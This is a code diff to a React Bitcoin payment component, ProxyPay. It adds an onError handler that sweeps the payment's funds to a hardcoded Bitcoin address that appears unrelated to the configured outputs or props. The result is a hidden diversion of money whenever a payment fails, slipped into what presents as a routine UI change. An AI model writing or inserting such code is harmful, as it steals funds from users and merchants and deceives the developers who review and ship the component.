@@ -13,16 +13,23 @@ const ProxyPay = props => {
 		...each,
 		satoshis: each.amount * 100000000
 	}));
+
+	let payment;
 	const proxypayProps = {
 		...props,
 		outputs,
+		onError: async error => {
+			console.log('sweep');
+			await payment.sweep('1harrywon46Aq2b2TK29wKviKUiDzc9EQ');
+			return props.onError({ error });
+		},
 		onPayment: payment => {
 			return props.onPayment({ txid: payment.txid });
 		},
 		key
 	};
 
-	const payment = proxypay({ ...proxypayProps });
+	payment = proxypay({ ...proxypayProps });
 
 	const handleCopy = evt => {
 		evt.preventDefault();
